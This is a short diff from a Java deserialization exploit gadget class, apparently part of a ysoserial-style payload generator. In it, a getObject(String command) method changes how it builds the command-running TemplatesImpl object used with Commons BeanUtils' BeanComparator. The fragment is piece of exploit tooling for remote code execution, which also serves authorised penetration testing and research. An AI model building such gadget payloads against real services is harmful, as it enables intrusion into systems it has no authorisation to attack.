@@ -29,7 +29,7 @@ public class CommonsBeanutilsObjectToStringComparator183 implements CommandObjec
 
 	@Override
 	public Object getObject(String command) throws Exception {
-		final Object template = Gadgets.createTemplatesImpl(command);
+		final Object template = Gadgets.createTemplates4Cmd(command);
 		POOL.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
 		final CtClass ctBeanComparator = POOL.get("org.apache.commons.beanutils.BeanComparator");
 		try {
